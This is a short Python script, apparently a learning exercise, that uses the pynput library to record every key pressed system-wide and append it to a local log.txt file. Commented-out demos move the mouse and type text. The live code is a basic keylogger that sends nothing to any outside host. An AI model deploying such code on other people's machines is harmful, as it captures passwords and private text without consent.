from pynput.mouse import Controller
from pynput.keyboard import Controller

from pynput.keyboard import Listener

# here is how we can control the mouse and keyboard using pynput module

# def controlMouse():
#     mouse = Controller()
#     mouse.position = (100,200)
#                     #left to right, top to bottom
# def controlKeyboard():
#     keyboard = Controller()
#     keyboard.type("Hello Mr.Robort")
# controlKeyboard()

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == "Key.space":
        letter = " "

    if letter == "Key.shift":
        letter = ""

    if letter == "Key.shift_r":
        letter = ""
    
    if letter == "Key.ctrl_l":
        letter = ""
    
    if letter == "Key.enter":
        letter = "\n"
    
    with open("log.txt", "a")  as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()


